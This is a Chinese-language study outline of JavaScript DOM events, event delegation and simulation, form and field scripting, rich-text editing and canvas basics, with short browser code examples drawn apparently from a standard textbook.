      当图片加载完后在<img>元素上触发,
        e.g.:
          检查图片是否加载完成,有时需要确保图片完成加载以便执行后面的操作：
          $('img').load(function () {
            console.log('image load successful');
          });
      当嵌入内容加载完后在<object>元素上触发
    unload  卸载时触发
      只要用户从一个页面切换到另一个页面就会发生unload事件
      当页面完全卸载后在window上触发,
      所有框架都卸载后在框架集上触发,
      嵌入的内容卸载完毕后在<object>元素上触发
    resize  当窗口或框架的大小变化时在window或框架上触发
      Firefox只会在用户停止调整窗口大小时才触发事件
      IE Safari Chrome Opera 会在浏览器窗口变化了1px时就触发
      浏览器窗口在最小化或最大化时,也会触发resize事件
    scroll  当用户滚动带滚动条的元素中的内容时,在该元素上触发
    abort   在用户停止下载过程时,若嵌入的内容没有加载则在<object>上触发
    error   发生错误时触发
      当发生JS错误时在window上面触发,
      无法加载图像时在<img>元素触发,
      无法加载嵌入内容在<object>元素上触发,
      有框架无法加载时在框架集上触发
    select  当用户选择文本框(input 或 textarea)中的字符时触发
      支持该事件的标签:<input type="text">, <textarea>
  焦点事件 当元素获得或失去焦点时触发
    blur  元素失去焦点时触发,该事件不会冒泡
    focus 元素获得焦点时触发,该事件不会冒泡
    focusin 与focus等价,但冒泡
    focusout 元素失焦时触发
  鼠标事件 当用户通过鼠标在页面上执行操作时触发.
    click    在左键按下后,弹起来时触发或按下回车键时触发
      同一个元素上相继触发mousedown和mouseup事件才会触发click事件
     (若有一个被取消就不会触发click事件)
    dblclick   鼠标双击
    mousedown  用户按下任意鼠标按钮触发
    mouseup    鼠标弹起触发
    mouseenter 鼠标光标从元素外部首次移动到元素范围之内时触发,该事件不冒泡
    mouseleave 元素上的鼠标移动到元素范围之外时触发,该事件不冒泡
    mousemove  光标在元素内移动时重复触发
    mouseout   光标从一个元素到另一个元素时触发
     (另一个元素可能位于前一个元素外,也可能是前一个元素的子元素)
    mouseover  光标首次移到元素上时触发
    当事件是 mouseover 和 mouseout 时
      e.relatedTarget; 属性的值表示:移到/移出触发事件的元素最近的那个元素
      对于其他事件该属性值为null
      IE的处理方式:
       e.toElement;
       e.fromElement;
    mousewheel 使用鼠标滚轮或类似设备时触发
      event 对象除了包含鼠标事件的所有标准信息外还有一个wheelDelta属性
      e.wheelDelta; 向前滚动鼠标时,wheelDelta是120的倍数,向后为 -120 的倍数
    触摸设备 (详参 间 JavaScript高级程序设计 378页)
      不支持dblclick事件,双击浏览器窗口会放大画面而且没有办法改变该行为
    鼠标按钮
      e.button; 返回数值,对应表示鼠标的按钮
      e.g. 通过事件对象来检测鼠标点击的键
        document.onmousedown =function(evt){
          if(getButton(evt) ==0)alert('左键');
          if(getButton(evt) ==1)alert('中键');
          if(getButton(evt) ==2)alert('右键');
        }
        function getButton(evt){
          var e =evt||window.event;
          if(evt){
            return e.button;
          }else if(window.event){
            switch(e.button){
              case 1:
                return 0;
              case 4:
                return 1;
              case 2:
                return 2;
            }
          }
        }
  键盘事件 当用户通过键盘在页面上执行操作时触发
    PS:当按下键盘上的字符串时,先触发keydown事件然后是keypress,松开触发keyup
      当按下非字符键,先触发keydown,松开触发keyup
    keydown    按下任意键时触发,按住不放会一直触发
    keypress   按下字符键时触发,按住不放会一直触发
      任何获得焦点的元素都可以触发keypress事件
    keyup      释放按键时触发
    键码
      e.keyCode; 属性值与ASCII码中对应小写字母或数值的编码相同
        Backspace   8
        Tab         9
        Enter       13
        Shift       16
        Alt         18
        Pause/Break 19
        CapsLock    20
        Esc         27
        Page Up     33
        Page Down   34
        End         35
        Home        36
        Left Arrow  37
        Up Arrow    38
        Right Arrow 39
        Down Arrow  40
        ...
        a           65(与Shift键的状态无关)
      e.key;  返回字符串(DOM3新增)
      e.charCode; (DOM3不再包含)
      e.char;(DOM3新增)
      e.location; 表示按了在键盘什么区域上的键(DOM3新增)(兼容性不好)
        0 表示默认键盘
        1 左侧位置(如左位的Alt键)
        2 右侧位置(如右位的Shift键)
        3 数字小键盘
        4 移动设备键盘(虚拟键盘)
        5 手柄
      e.getModifierState(); 用于检测修改键,返回布尔值(只有IE9支持)
        参数为: "Control" "Shift" "AltGraph" "Meta"
    设备中的键盘事件(详情参见 JavaScript高级程序设计 384页)
  文本事件 当在文档中输入文本时触发
    textInput 在文本插入文本框之前会触发(DOM3新增)
      只有可编辑区域才能触发该事件
      e.data; 表示用户输入的字符(如可能为s或S取决于是否按了Shift)
  合成事件 当为IME(Iput Method Editor,输入法编辑器)输入字符时触发
    PS:复合事件时DOM3级事件中新添加的一类事件,用于处理IME的输入序列
      IME可以让用户输入在物理键盘上找不到的字符(如输入中文)
      浏览器支持率度不高
    compositionstart  在IME的文本复合系统打开时触发,表示要开始输入了
      e.data; 包含正在编辑的文本(如已经选中的需要马上替换的文本)
    compositionupdate 在向输入字段中插入新字符时触发
      e.data; 正在插入的文本
    compositionend    在IME的文本复合系统关闭时触发,表示返回正常键盘输入状态
      e.data; 包含此次输入会话中插入的所有字符
  变动事件 当底层DOM结构发生变化时触发
    变动事件是为XML或HTML DOM设计的,不特定于某种语言
    DOM2级定义了如下变动事件
   (详情参见 JavaScript高级程序设计 384页)
  变动名称事件 当元素或属性名变动时触发.(已被废弃)
  ◆HTML5事件
    PS:DOM规范没有涵盖所有浏览器支持的事件
      HTML5详尽列出了浏览器应该支持的所有事件
     (如下为浏览器完善支持的部分事件)
  contextmenu  上下文菜单事件
    当点击网页时,会自动出现Windows自带的菜单
    使用contextmenu 事件来修改指定的菜单(前提将默认行为取消)
  beforeunload  离开前事件
    PS:表示的是离开关闭/刷新网页时,触发的事件
      目的是让开发人员能在页面卸载前阻止这一操作
    弹出确认对话框
      须将 e.returnValue 的值设为要显示给用户的字符串(IE 及 Firefox)
      要显示给用户的字符串作为函数的返回值返回(safari 和 Chrome)
    e.g.
    jquery离开页面弹出提示代码
      //绑定beforeunload事件
      $(window).bind('beforeunload',function(){
        return '您输入的内容尚未保存,确定离开此页面吗？';
      });
      //解除绑定,一般放在提交触发事件中
      $(window).unbind('beforeunload');
    js离开页面提示
      window.onbeforeunload = function(event) {
        return confirm("确定退出吗");
      }
      // 在Chrome中不会显示 返回的字符(而是Chrome自设的默认字符)
  DOMContentLoaded 形成完整的DOM树后触发
    与load事件不同,不会理会图像、JS文件、CSS文件或其他资源是否下载完毕,在load之前触发
  readystatechange
    e.readyState;
      返回值
      uninitialized   对象存在但尚未初始化
      loading  对象正在加载数据
      loaded 对象加载数据完成
      interactive  可以操作对象了,但还没有完全加载
      complete 对象已经加载完毕
  hashchange URL变化时在window上触发 [IE8+]
    PS:当#值发生变化时也会触发这个事件
    e.oldURL; 变化前的URL
    e.newURL; 变化后的URL
  // 设备相关事件
  (详参 JavaScript高级程序设计 395 页)
  ◆其他事件:
    popstate   网页前进、后退
     当用户点击历史记录的前进或后退时,会触发window的popstate事件
     e.g.
       window.addEventListener("popstate",function(e){
         var state1 =e.state;
         // state1 就是 pushState 的第一个参数,详情常见BOM history
         console.log(state1)
       })
    propertychange [IE专有] 
     不管js操作还是键盘鼠标手动操作,只要HTML元素属性发生改变即可立即捕获到.
    input    监听表单值改变 (IE9+支持)
     适用元素: input type=text , textarea
     使用情景: 粘贴可触发;
     HTML5中的标准事件
     在Chrome中通过JS改变表单的值,不会触发
     ios微信中,自定义获取焦点存在问题
    selectstart 其触发时间为目标对象被开始选中时(即选中动作刚开始,尚未实质性被选中)
     该事件常使用于使目标对象“禁止变蓝”,比如在很多地方当用户双击时,一些元素会变成蓝色(选中状态)
     而当我们要避免这种情况时就可以使用该事件
     e.g. <div onselectstart="return false">该文字不可被选中</div>
    change:当文本框(input或textarea)内容改变且失去焦点后触发
    error  任何没通过try-catch处理的错误都会触发window对象的error事件
     和其他事件不同的是,error事件不会创建event对象,
     取而代之的是三个参数:错误消息、错误所在的URL和行号
     e.g. :
     window.onerror =function(message,url,line){
       ...
       return false; // 可阻止浏览器报告错误的默认行为
     }
     图像的error事件:只要图像加载失败或显示失败就会触发error事件,会生成event对象
    online 网络从离线变成在线时触发 (HTML5新增)
    offline 网络从在线变成离线时触发(HTML5新增)
    transitionEnd  CSS的过渡效果(transition)结束后触发
     事件对象的属性
       propertyName：发生transition效果的CSS属性名.
       elapsedTime： transition效果持续的秒数,不含transition-delay的时间.
       pseudoElement：如果transition效果发生在伪元素,会返回该伪元素的名称,以“::”开头.
         如果不发生在伪元素上,则返回一个空字符串.
     e.g.:
     elem.addEventListener('transitionend',function(){},false);
     实际使用transitionend事件时,可能需要添加浏览器前缀.
     el.addEventListener('webkitTransitionEnd',function() {});
    animationstart 动画开始时触发
    animationend   动画结束时触发
    animationiteration 开始新一轮动画循环时触发
     如果animation-iteration-count属性等于1,该事件不触发,
     即只播放一轮的CSS动画,不会触发animationiteration事件.
     这三个事件的事件对象
       都有animationName属性(返回产生过渡效果的CSS属性名)
       elapsedTime属性(动画已经运行的秒数)
       对于animationstart事件,elapsedTime属性等于0,除非animation-delay属性等于负值.
    checkbox选中时的事件是什么 [?]
    pageshow  网页重载时触发
     PS:重载时会在load事件触发后触发,若页面来自bfcache,则在页面状态完全恢复时触发;
       虽然这个事件的目标是 document,但必须将其事件处理程序添加到 window 上;
     e.g.:
       var EventUtil = {
         addHandler: function (element, type, handler) {
           if (element.addEventListener) {
             element.addEventListener(type, handler, false);
           } 
           else if (element.attachEvent) {
             element.attachEvent("on" + type, handler);
           } 
           else {
             element["on" + type] = handler;
           }
         }
       };
       (function () {
         var showCount = 0;
         EventUtil.addHandler(window, "load", function () {
           console.log("Load fired");
         });
         EventUtil.addHandler(window, "pageshow", function (event) {
           showCount++;
           console.log("Show has been fired " + showCount + " times.");
         });
       })();
       当页面首次加载完成时,showCount的值为0
       若离开包含以上代码的页面后,又“后退”到该页面,showCount就会递增;
       因为该变量及整个页面的状态,都保存在了内存中,当返回时,变量的状态得到了恢复;
       如果刷新浏览器,则showCount的值会被重置为0,因为页面已经完全重新加载了。
     event.persisted  返回表示页面是否来自bfcache的布尔值
    pagehide  在浏览器卸载页面的时候触发 「unload事件之前」
     PS:与pageshow一样,在document上面触发,但必须要绑定在Windows对象上;
       指定了unload事件处理程序的页面会被自动排除在bfcache之外,即使事件处理程序是空的。
       因为unload常用于撤销在load中所执行的操作,而跳过load后显示页面可能导致页面异常  
     event.persisted  返回页面是否将保存在bfcache中的布尔值
       若在Firefox浏览器中, 当第一次触发pageshow时,persisted的值一定是false,
       而在第一次触发pagehide时,persisted 为true
  ◆剪贴版事件
   IE率先使用,HTML5纳入规范
   beforecopy 在发生复制操作前触发
   copy       在发生复制操作时触发
   beforecut  在发生剪切操作前触发
   cut        在发生剪切操作时触发
   beforepaste 在发生粘贴操作前触发
   paste      在发生粘贴操作时触发
   访问剪贴板中的数据:clipboardData对象
     使用 clipboardData 对象,IE中其为window的属性,其他浏览器为事件对象event的属性
     clipboardData.getData(formatstr);   从剪贴板中取得数据
       Arguments:formatstr 表示数据格式的字符串
         IE中有两种格式 "text" "URL"
         其他浏览器 该参数是一种MIME类型(可使用"text"代表"text/plain")
     clipboardData.setData(formatstr,str); 设置剪贴板中的数据,返回布尔值表示是否成功操作
       Arguments:formatstr 仍然是数据类型(但其他浏览器已不能识别 "text")
         第二个参数为要更换的字符串
     clipboardData.clearData(); 从剪贴板中清除数据
  ◆移动端事件
   touchstart
   touchend
   touchmove
  Remarks:
    页面加载时只执行 onload
    页面刷新时先执行 onbeforeunload,然后 onunload,最后 onload
    页面关闭时先执行 onbeforeunload,最后 onunload
事件委托 
  PS:
    在创建GUI的语言(如C#)中,为GUI中的每个按钮添加一个onclick事件处理程序很常见,
    但是在JavaScript中添加到页面上的事件处理程序数量直接关系到页面的整体运行性能,
    每当绑定事件时,浏览器代码会与支持页面交互的JS代码间建立一个链接,
    链接越多页面执行起来就越慢
    原因1:每个函数都是对象会占用内存
    原因2:绑定事件增加DOM访问次数,会延迟整个页面的交互就绪时间
    利用冒泡/捕获的原理,把事件加到父级上,触发子元素执行效果
    使用事件委托技术能避免对特定的每个节点添加事件监听器
  e.g. :
    a 是b的父元素,b是c和d的父元素,通过给a添加click事件,删除c和d.
    // 给父元素a绑定事件
    a.addEventListener('click', function(event){
      //函数的参数event表示该响应的事件本身
      var tarEle = event.target
      //event.target 表示响应该事件的元素,此处为c、b、a
      if(tarEle.classList.contains('c元素独有的类名')) {
        // 通过条件判断(该元素是否包含该属性)给元素c执行下面操作
        tarEle.parentElement.remove()
        // 删除c的父元素b(其中b包括c和d),达到删除元素c和d
      }
    })
事件模拟 
  PS:使用JS来触发特定的事件
    DOM2级规范了模拟特定事件的方式
    IE有自己的模拟方式
  document.createEvent(str);   创建event对象
    Arguments:表示要创建的事件类型的字符串
      DOM2级中都使用英文复数形式
      DOM3级中都使用英文单数形式
      UIEvents       一般的UI事件,鼠标、键盘事件都继承至UI事件
      MouseEvents    一般的鼠标事件
      MutationEvents 一般的DOM变动事件
      HTMLEvents     一般的HTML事件(DOM3中无该事件,被分散到其他类别中去了)
  nod.dispatchEvent(e);     触发创建的事件
  // 模拟鼠标事件
  var e =document.createEvent("MouseEvents");
  e.initMouseEvent();  指定与鼠标事件有关的信息.
    接收15个参数
    type  字符串,表示要触发的事件类型(如 "click")
    bubbles  布尔值,表示事件是否应该冒泡(一般设置为true)
    cancelable 布尔值,表示事件是否可以取消(一般设置为true)
    view  与事件关联的视图(通常设置为 document.defaultView)
    detail 整数,与事件有关的详细信息(通常设置为0)
    screenX 整数,事件行对于屏幕的X坐标
    screenY 整数,事件行对于屏幕的Y坐标
    clientX 整数,事件相对于视口的X坐标
    clientY 整数,事件相对于视口的Y坐标
    ctrlKey 布尔值,表示是否按下了Ctrl,默认值为false
    altKey 布尔值,表示是否按下了Alt,默认值为false
    shiftKey 布尔值,表示是否按下了Shift,默认值为false
    metaKey 布尔值,表示是否按下了Meta,默认值为false
    button 整数,表示按下了哪一个鼠标键,默认值为0
    relatedTarget 对象,表示与事件相关的对象(只在模拟 mouseover 和mouseout时使用)
  e.g. :
    var btn =document.getElementById("myBtn");
    // 创建事件对象
    var event =document.createEvent("MouseEvents");
    // 初始化事件对象
    event.initMouseEvent("click",true,true,document.defaultView,0,0,0,0,0,false,false,false,false,0,null)
    // 触发事件
    btn.dispatchEvent(event);
  // 模拟键盘事件
  (详参 JavaScript高级程序设计 407页)
  // 模拟其他事件
  (详参 JavaScript高级程序设计 409页)
  兼容写法
    function trigger(elem, type) {
      if (document.createEvent) {
        var event = document.createEvent('HTMLEvents');
        event.initEvent(type, true, false);
        elem.dispatchEvent(event);
      } else {
        elem.fireEvent('on' + type);
      }
    }

    var t = document.getElementById('test');
    trigger(t, 'click');
自定义事件 「DOM3+」「IE8+ ?」
  var evt =document.createEvent("CustomEvent");    创建事件
  evt.initEvent('customEvent',true,true);          定义事件类型
  evt.initCustomEvent(str,boo,boo,obj);
    str  触发的事件类型 type
    bool 表示事件是否应该冒泡
    bool 表示事件是否可以取消
    obj  任意值,保存在event对象的detail属性中.
  elem.addEventListener('customEvent',cfoo,false); 监听事件
  elem.dispatchEvent(evt);     触发事件
采用对象封装法使事件兼容处理: 
  var eventCompat ={
    add:function(elem,type,func){
      if(elem.addEventListener) {
        elem.addEventListener(type,func);
      }else if(elem.attachEvent) {
        elem.attachEvent("on"+type,func);
      }else {
        elem["on"+type]=func;
      }
    },
    remove:function(elem,type,func){
      if(elem.addEventListener) {
        elem.removeEventListener(type,func);
      }else if(elem.attachEvent) {
        elem.detachEvent("on"+type,func);
      }else {
        elem["on"+type]=null;
      }
    },
    gete:function(e){
      return e?e:window.e;
    },
    getType:function(e){
      return e.type;
    },
    getElem:function(e){
      return e.target || e.srcElement;
    },
    preventDefault:function(e){
      if(e.preventDefault) {
        e.preventDefault();
      }else {
        e.returnValue =false;
      }
    },
    stopPropagation:function(e){
      if(e.stopPropagation) {  // 使用属性的形式来判断
        e.stopPropagation();
      }else {
        e.cancelBubble =true;
      }
    }
  }
事件切换器 
  传统方式实现
    同时存在多个相同的事件,会被覆盖
    执行太多次,浏览器会卡,因为太多的递归.
    window.onload=function(){
      var box=document.getElementById("box");
      box.onclick=toBlue;
    };
    function toRed(){
      this.className="red";
      this.onclick=toBlue;
    }
    function toBlue(){
      this.className="blue";
      this.onclick=toRed;
    }
事件归纳总结 
  事件枚举及分类
    scroll  当滚动带滚动条的元素时在该元素上触发,网页滚动在window上触发
      window.onscroll =function(){
        console.log('网页滚动');
      }
  事件绑定
    var addEvent = function(elem, type, handle, capture) {
      if(elem.addEventListener) {
        elem.addEventListener(type, handle, capture);
      } else if(elem.attachEvent) {
        elem.attachEvent("on" + type, handle);
      }
    };
    e.g.:
      var t = document.getElementById('test');
      addEvent(t, 'click', function(){});
  事件移除
    var deleteEvent = function(elem, type, handle) {
      if(elem.removeEventListener) {
        elem.removeEventListener(type, handle);
      } else if(elem.detachEvent) {
        elem.detachEvent('on' + type, handle);
      }
    };
    e.g.:
      var t = document.getElementById('test');
      deleteEvent(t, 'click', fn);
  对事件的认识
    e.g.:
      $('#btn').on('click',function(){
        $(this).addClass('aoo');
        if ($(this).hasClass('aoo')) { 
          console.log('该元素点击之前无aoo类时,也会执行该语句'); 
        }
      })
      改为
      $('#btn').on('click',function(){
        if ($(this).hasClass('aoo')) { 
          console.log('该元素点击之前有aoo类时,才会执行该语句'); 
        }
        $(this).addClass('aoo');
      })
e.g.:  
  给按钮添加一个点击click事件
    获取按钮          var bu = document.querySelector("#xxx");
    声明响应的动作.点击后执行   var cli = function(){ console.log("点到我了"); }
    添加事件/监听事件  元素a.addEventListener("事件名称b",执行的函数c,true/false)
      PS:当在元素a上发生事件b时,执行函数c.
        事件响应时,浏览器会给执行的函数传一个参数,该参数表示事件本身.
      true/false 可选填,默认为false.
      此处为 bu.addEventListener("click",cli)
  给多个元素添加同一事件
    ⒈  获取多个元素;
      var b = document.querySelectorAll(".xx")
      // 获得具有 .XX 类的所有元素,并用一个数组表示.
    ⒉  遍历每个元素,并绑定事件
      for(var i = 0; i < b.length; i++) {
        b[i].addEventListener("click",function(e){
          // 浏览器定义 事件响应函数的参数,表示事件本身.
          var s = e.target
          // 使用b.target得到响应事件的元素.
          s.classList.add("XX")
          // add用来添加一个class
          c();
          // c为自定义函数,目的是将包含.XX样式的元素中移除.XX样式
        })
      }
      function c(){
        var a = document.querySelector('.xx');
        if(a!=null) {
          a.classList.remove("xx")
        }
      }
--------------------------------------------------------------------------------
◆专题 
表单及表单字段脚本 
  PS:HTML中,表单由<form>元素表示,JS中表单使用 HTMLFormElement 类型表示
    HTMLFormElement 继承了 HTMLElement ,因而与其他HTML元素具有相同的默认属性;
    表单字段为表单中的元素,如input button textarea select 等等
  表单元素  [self: 使用formElem表示表单元素]
    ◆获取表单元素
    document.forms;  获取页面中所有的表单集合,可通过下标或name值来索引特定的表单
      e.g.: 通过 document.forms 的下标和name值来获取表单
        <form class="" action="index.html" method="post" name="aoo">
          <input type="text" name="field" value="" id>
          <input type="submit" name="" value="">
        </form>
        <form class="" action="index.html" method="post" name="boo">
          <input type="text" name="field" value="" id>
          <input type="submit" name="" value="">
        </form>
        var formelem1 = document.forms[0];   获取第一个表单元素
        var formelem2= document.forms.boo;   获取到第二个表单元素
    ◆属性&方法
    formElem.acceptCharset  服务器能够处理的字符集
      等价于HTML中的 accept-charset 特性
    formElem.action  接收请求的URL,等价于HTML中的action特性
    formElem.elements 表单中所有控件的集合,HTMLCollection
      表单字段在elements中出现的顺序和它们在标记中出现的顺序相同
      可通过下标或name索引,其中name索引返回的为一个数组NodeList
    formElem.enctype  请求的编码类型,等价于HTML中的enctype特性
    formElem.length  表单中控件的数量
    formElem.method  要发送的HTTP请求类型,等价于HTML的method特性
    formElem.name    表单的名称,等价于HTML的name特性
    formElem.reset()  将表单的所有域重置为默认值
    formElem.submit() 提交表单
      可以不需要提交按钮存在
    formElem.target   发送请求和接收响应的窗口名称,等价于HTML的target特性
    formElem.checkValidity()   检测表单是否有无效字段(值不符合要求),若有则返回false
      如果验证通过返回true。如果验证失败,则会触发一个invalid事件。
      使用该方法以后,会设置validity对象的值。
    formElem.noValidate = true;    将原生的表单验证关闭
      原生的表单验证不完全符合需要,而且出错信息无法指定样式。
      这时,可能需要使用表单对象的noValidate属性,将原生的表单验证关闭。
      e.g.:关闭原生的表单验证,然后指定submit事件时,让JavaScript接管表单验证
        var form = document.getElementById("myform");
        form.noValidate = true;
        form.onsubmit = validateForm;
    formElem.validity      返回一个包含字段有效信息的对象 (详参 js高级程序设计 430 页)
      每一个表单元素都有一个validity对象,有以下属性:
      valid         如果该元素通过验证,则返回true。
      valueMissing  如果用户没填必填项,则返回true。
      typeMismatch  如果填入的格式不正确(比如Email地址),则返回true。
      patternMismatch 如果不匹配指定的正则表达式,则返回true。
      tooLong       如果超过最大长度,则返回true。
      tooShort      如果小于最短长度,则返回true。
      rangeUnderFlow  如果小于最小值,则返回true。
      rangeOverflow   如果大于最大值,则返回true。
      stepMismatch    如果不匹配步长(step),则返回true。
      badInput      如果不能转为值,则返回true。
      customError   如果该栏有自定义错误,则返回true。
    formElem.setCustomValidity 用于自定义错误信息
      该提示信息也反映在该输入框的validationMessage属性中。
      如果将setCustomValidity设为空字符串,则意味该项目验证通过。        
    ◆表单事件
    submit 提交表单事件,点击提交按钮或提交按钮获取焦点按Enter时在form元素上触发
      submit 和 click 事件:不同的浏览器触发的先后顺序不一样
    reset  重置表单事件,点击重置按钮或重置按钮获取焦点按Enter时在form元素上触发
  表单字段  [self: 使用inputElem表示表单字段元素]
    ◆获取表单字段
    form.inputElemName  通过表单元素中表单字段的name属性来获取表单字段
    ◆属性&方法
    inputElem.disabled  布尔值,表示当前表单字段是否被禁用
    inputElem.form      表示当前字段所属的表单,只读
    inputElem.name      当前字段的名称
    inputElem.readOnly  布尔值,表示当前字段是否只读
    inputElem.tabIndex  表示当前字段的切换(Tab)序号
    inputElem.type      当前字段的类型(如 "checkbox" "radio"等等)
      <input> 和 <button> 的type属性可读写
      <select>元素的type属性只读
    inputElem.value     当前字段将被提交给服务器的值
      对于 type=file 该属性只读,包含着文件在计算机中的路径
      input、textarea、password、select等元素都可以通过value属性取到它们的值
    inputElem.defaultValue;  默认值
    inputElem.focus()   字段获取焦点
    inputElem.blur()    字段失去焦点
    inputElem.willValidate = true;  开启单个表单字段验证
      对于那些不支持的浏览器(比如IE8),该属性等于undefined。
      即使willValidate属性为true,也不足以表示浏览器支持所有种类的表单验证。
      比如,Firefox 29 不支持date类型的输入框,会自动将其改为text类型,
      而此时它的willValidate属性为true。
      为了解决这个问题,必须确认input输入框的类型(type)未被浏览器改变。
      if (field.nodeName === "INPUT" && field.type !== field.getAttribute("type")) {
          // 浏览器不支持该种表单验证,需自行部署JavaScript验证
      }
    ◆表单字段事件
    change  表单值改变时触发
      支持该事件的 JavaScript 对象： fileUpload, select, text, textarea 等
      input或textarea元素值变化且失焦时触发
      select元素其选项改变时触发
      input+type=range   划条拖动松开鼠标时响应
      松开鼠标前拖动时不会实时响应,使用函数改变值也不会响应
      input+type=file    选择文件加载到浏览器上时触发
      change 和 blur 事件的关系:在不同的浏览器中触发的先后顺序不一致
    select  选中文本框的文本松开鼠标时触发
      使用 elem.select()也会触发
  表单发送的规则
    对表单字段的名称和值进行URL编码,使用&分割
    不发送禁用的表单字段
    只发送勾选的复选框和单选按钮
    多选选择框中的每个选中的值单独一个条目
    单击提交按钮也会发送提交按钮,否则,不发送提交按钮(包括type为image的input元素)
    select元素的值,就是选中的option元素的value特性的值,若option元素没有value特性,则是其文本值
  input+type=text 和 textarea 文本框
    在其文本框中输入的内容保存在他们的value中
    text.select()  选择文本框中所有的文本
    text.selectionStart  光标选中文本开始的字符下标表示 [HTML5新增]
      e.g. : 获取所选字符
        text.value.substring(text.selectionStart,text.selectionEnd);
    text.selectionEnd    光标选中文本结束的字符下标表示
    text.value.setSelectionRange(begin,end)   获取部分字符
  select 和 option  下拉列表 
    ◆HTMLSelectElement 类型表示选择框<select>提供了下列属性和方法
      也拥有表单字段共有的属性和方法
    selecElem.size 选择框中可见的行数,等价于HTML中的size特性
    selecElem.multiple 是否允许多项选择的布尔值,等价于HTML中的multiple特性
    selecElem.selectedIndex; 选中项的索引值,若没有选中项,则值为-1
      selectElem[selectElem.selectedIndex]  表示被选中的选项元素的元素对象
    selecElem.options 控件中所有<option>元素的HTMLCollection
      selecElem.options.length=0; // 删除所有选项option
      selecElem.options[index]=new Option("新文本","新值"); // 修改选项option
    selecElem.add(newOption[,relOption]); 在relOption之前插入newOption元素
      若要在最后添加,则relOption为null/undefined
      selecElem.add(new Option("文本","值")); // 这个只能在IE中有效
      selecElem.options.add(new Option("text","value")); // 这个兼容IE与firefox
    selecElem.remove(index); 移除给定位置的选项
      移除也可使用DOM的removeChild()方法
      或将该项设置为null(DOM出现之前的处理方式)
    选择框的value属性由当前选中项决定
      若没有选中的项,则value属性返回空字符串""
      若有一个选中项,且该项的value特性已经在HTML中指定,则选择框的value属性等于选中项的value特性
        若该项的value特性在HTML中未指定,则选择框的value属性等于该项的文本
      若有多个选中项,则为第一个选中项的值
    <select name="categories" id="categories" multiple></select> 设置为多选时
      设为多选时,value只返回选中的第一个选项。
      要取出所有选中的值,就必须遍历select的所有选项,检查每一项的selected属性。
      var selected = [] , count = elem.options.length ;
      for (var i = 0 ; i < count; i++) {
        if (elem.options[i].selected) {
          selected.push(elem.options[i].value);
        }
      }
    ◆HTMLOptionElement 对象表示<option>元素,有下列属性
      PS:也可以使用常规DOM功能来访问,但效率比较低下
    创建选择项的方法
      方式一:使用DOM创建 设定 再添加到DOM中
      方式二:使用构造函数创建 new Option("文本text","值value") 再添加到DOM中
        该方法在DOM出现之前就有,一直遗留到现在
    optElem.index  当前项在options集合中的索引z值
    optElem.label  当前选项的标签,等价于HTML中的label特性
    optElem.selected 布尔值,表示当前选项是否被选中,可读写
      单选情况下,设置一选项的该属性为true,会取消对其他选项的选择
        设置该属性为false,不产生影响(?)
      多选情况下,设置一选项的该属性为true,其他选项无影响
    optElem.text  选项的文本
    optElem.value  选项的值,等价于HTML中的value特性
  checkbox 多选框控件
    checkboxElem.checked  可写,返回一个布尔值,表示用户是否选中
  radio 单选框控件
    radioElem.checked 
      e.g.:只有通过遍历,才能获得用户选中的那个选择框的value。
        <input type="radio" name="gender" value="Male"> Male </input>
        <input type="radio" name="gender" value="Female"> Female </input>
        <script>
        var radios = document.getElementsByName('gender');
        var selected;
        for (var i = 0; i < radios.length; i++) {
          if (radios[i].checked) {
            selected = radios[i].value;
            break;
          }
        }
        if (selected) {
          // 用户选中了某个选项
        }
        </script>
        如果用户未做任何选择,则selected就为undefined。
其他标签脚本 
  <a href="#"></a> 超链接
    URL 协议
      URL 支持 javascript: 协议,调用URL时会执行对应的JS代码
      e.g.: <a href="Javascript:console.log(111);">11111111</a>
      浏览器地址栏也支持 javascript: 协议
      e.g.: 将 javascript:console.log(111) 放入地址栏,回车执行
      若JS代码返回的为字符串,则浏览器会在页面中显示出该字符串
        Chrome: 清空当前页面,显示出返回的字符串
        <a href="Javascript:'aaa'" target="_blank">11111111</a>  
        javascript:"aaa"   // 在浏览器地址栏中键入
  <script src="" charset="utf-8"></script>  脚本引入 
WYSIWYG,富文本编辑 
  PS:即what you see is what you get,所见即所得
    由IE引入,虽然没有规范,已经称为了事实标准
    技术本质为在页面中嵌入一个包含空HTML页面的iframe,
    通过设置designMode属性,使该HTML页面可以被编辑,
    编辑的对象则是该页面<body>元素的HTML代码.
    designMode 属性有两个可能的值: "off" 和 "on"(on时则可编辑)
    需要等到页面完全加载之后才能设置为可编辑状态(一般使用 load事件监听)
  e.g. :
  在页面创建一个 iframe标签
  设置其designMode为"on"(frames["XX"].document.designMode ="on")
  注:在Chrome中不可使iframe的src外链其他文件(出于安全限制?)
  document.execCommand(); 文档预定义
    PS:方法也适用于页面中contenteditable属性为true的区块
      只是把对框架的document引用替换成当前窗口的document对象即可
    Arguments:接收三个参数
      执行的命名名称
      布尔值,表示浏览器是否提供用户界面(Firefox中设置为true会报错,一般设置为false)
      执行命令相应的值(不需要则为null)
      命令           值           说明
      backcolor     颜色字符串    设置文档背景色
      bold          null         将选择的文本转会为粗体
      ...
    e.g. :
    转换粗体文本
    frames["XX"].document.execCommand("bold",false,null);
 (详参 JavaScript高级程序设计 440页)
Canvas,画布 [详参 JavaScript高级程序设计 445 页] 「IE9+ HTML5」 
  PS:画布默认是透明的.
    在css中指定画布宽、高,会导致画布中的所有内容进行相应的缩放.
    <canvas> 标签只有两个属性—— width和height.
    当没有设置宽度和高度的时候,canvas会初始化宽度为300像素和高度为150像素.
    该元素可以使用CSS来定义大小,但在绘制时图像会伸缩以适应它的框架尺寸：
    如果CSS的尺寸与初始画布的比例不一致,它会出现扭曲.
  限制
    出于安全考虑,浏览器不允许处理跨域图像,但利用特殊的手段可以突破该限制 「?」
    可通过设置 Access-Control-Allow-Origin 来跨域
    解决处理跨域图像出现的安全警告的方法是使用CORS;
    为了阻止欺骗,浏览器会追踪 image data,
    当把跟canvas域不同的图片放到canvas上,canvas就成为“tainted”「被污染的,脏的」,
    浏览器就不让你操作该canvas 的任何像素,
    对于阻止多种类型的XSS/CSRF攻击「两种典型的跨站攻击」是非常有用的;
    没有服务器环境「比如本地的html网页,操作本地的一张图片」,
    会报"Unable to get image data ... has been tainted by cross-origin data"错误 
    本地网页的域为'file://,如：file:///home/summer/Desktop/test.html',
    本地图片不是以'file://'开头的,如 'c:\tmp\test.png'
  用途
    通过canvas,JS可以对图像进行像素级的操作,
    可以直接处理图像的二进制原始数据,为图像的签名技术提供了支持.
    canvas提供了常用的图像格式转换功能,可使用JS更改图像的编码方式.
  <canvas width="600" height="200">您的浏览器不支持画布,请升级</canvas> 添加画布标签
